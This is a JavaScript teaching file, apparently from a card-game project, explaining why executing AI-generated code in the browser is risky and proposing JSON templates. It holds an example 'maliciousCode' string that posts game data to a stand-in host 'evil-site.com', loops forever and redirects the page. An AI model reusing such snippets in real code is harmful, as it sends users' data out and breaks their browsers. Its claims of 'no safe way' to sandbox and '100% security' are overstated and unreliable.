/**
 * EDUCATIONAL: Why AI Code Generation is Dangerous in Browsers
 * 
 * This file explains the security risks and technical limitations
 * that make code generation unsuitable for production web apps.
 */

// ===== DANGER 1: CODE INJECTION ATTACKS =====

// What AI might generate (looks innocent):
const innocentLookingCode = `
function stealCard(gameState, rules, playerId) {
  // Steal a card from opponent
  const player = gameState.players.find(p => p.id === playerId);
  const opponent = gameState.players.find(p => p.id !== playerId);
  
  if (opponent.hand.length > 0) {
    const card = opponent.hand.pop();
    player.hand.push(card);
    return "Card stolen!";
  }
}`;

// What a malicious user could inject:
const maliciousCode = `
function stealCard(gameState, rules, playerId) {
  // This looks like a normal function but...
  
  // ATTACK 1: Data theft
  localStorage.setItem('stolen_data', JSON.stringify(gameState));
  
  // ATTACK 2: Network requests to attacker's server
  fetch('https://evil-site.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      userCards: gameState.players[0].hand,
      gameRules: rules,
      browserInfo: navigator.userAgent
    })
  });
  
  // ATTACK 3: Infinite loops to crash browser
  while(true) { console.log('crashing browser...'); }
  
  // ATTACK 4: Access to global scope
  window.location.href = 'https://malicious-site.com';
  
  return "Card stolen!";
}`;

// ===== DANGER 2: BROWSER SANDBOX LIMITATIONS =====

/**
 * Browsers have NO safe way to execute untrusted JavaScript
 * 
 * Unlike server environments that have:
 * - Virtual machines
 * - Containers (Docker)
 * - Process isolation
 * - Restricted file system access
 * 
 * Browsers give JavaScript code access to:
 * - All user data in localStorage/sessionStorage
 * - Network requests to any domain
 * - Access to the DOM and all page content
 * - User's clipboard
 * - User's camera/microphone (with permission)
 * - All other tabs in the same origin
 */

// ===== DANGER 3: TYPE SAFETY VIOLATIONS =====

// AI might generate code that breaks TypeScript assumptions:
const typeSafetyViolation = `
function badFunction(gameState, rules, playerId) {
  // AI doesn't understand your exact type definitions
  gameState.players = "corrupted"; // Should be Player[]
  gameState.deck = { malicious: "object" }; // Should be Card[]
  
  // This compiles but breaks everything at runtime
  return gameState.players.forEach(p => p.hand.push("invalid card"));
}`;

// ===== WHY eval() IS PARTICULARLY DANGEROUS =====

function demonstrateEvalDangers() {
  // Even with "safe" validation, eval can be exploited:
  
  // eval() executes EVERYTHING, not just the part you intended
  // eval(actualDangerousCode); // DON'T RUN THIS!
}

// ===== SERVER VS BROWSER SECURITY =====

/**
 * Why servers CAN sometimes safely execute generated code:
 * 
 * 1. ISOLATION: Each execution runs in a separate process/container
 * 2. LIMITED SCOPE: No access to user data, DOM, network requests
 * 3. TIMEOUTS: Can kill processes that run too long
 * 4. RESOURCE LIMITS: Can limit memory, CPU usage
 * 5. SANDBOXING: Technologies like Docker, chroot, VMs
 * 
 * Why browsers CANNOT:
 * 
 * 1. SHARED ENVIRONMENT: All code runs in same JavaScript context
 * 2. FULL ACCESS: JavaScript has access to everything in the browser
 * 3. NO ISOLATION: Can't separate generated code from app code
 * 4. NO LIMITS: Can't effectively limit resource usage
 * 5. PERSISTENT DAMAGE: Can corrupt localStorage, cookies, etc.
 */

// ===== THE SAFE ALTERNATIVE: TEMPLATES =====

/**
 * Instead of generating code, we generate DATA that describes actions
 * 
 * Template approach:
 * 1. AI generates JSON configuration (safe data)
 * 2. Pre-written, secure code interprets the configuration
 * 3. No eval() or code execution - just data processing
 * 4. Full type safety maintained
 * 5. Impossible to break out of sandbox
 */

const safeTemplateExample = {
  id: 'steal_and_draw',
  name: 'Steal and Draw',
  description: 'Steal a card from opponent, then draw one from deck',
  effects: [
    {
      type: 'steal_card',  // Pre-defined safe function
      source: 'opponent_hand',
      target: 'hand',
      amount: 1
    },
    {
      type: 'draw_cards',  // Pre-defined safe function
      source: 'deck',
      target: 'hand', 
      amount: 1
    }
  ],
  conditions: [
    { type: 'hand_size', operator: 'greater', value: 0, target: 'opponent' }
  ]
};

/**
 * This template approach gives us:
 * ✅ 99% of the flexibility of code generation
 * ✅ 100% security (no code execution)
 * ✅ Full type safety
 * ✅ Predictable behavior
 * ✅ Easy debugging
 * ✅ Performance (no eval overhead)
 */

export {
  innocentLookingCode,
  maliciousCode,
  typeSafetyViolation,
  demonstrateEvalDangers,
  safeTemplateExample
};
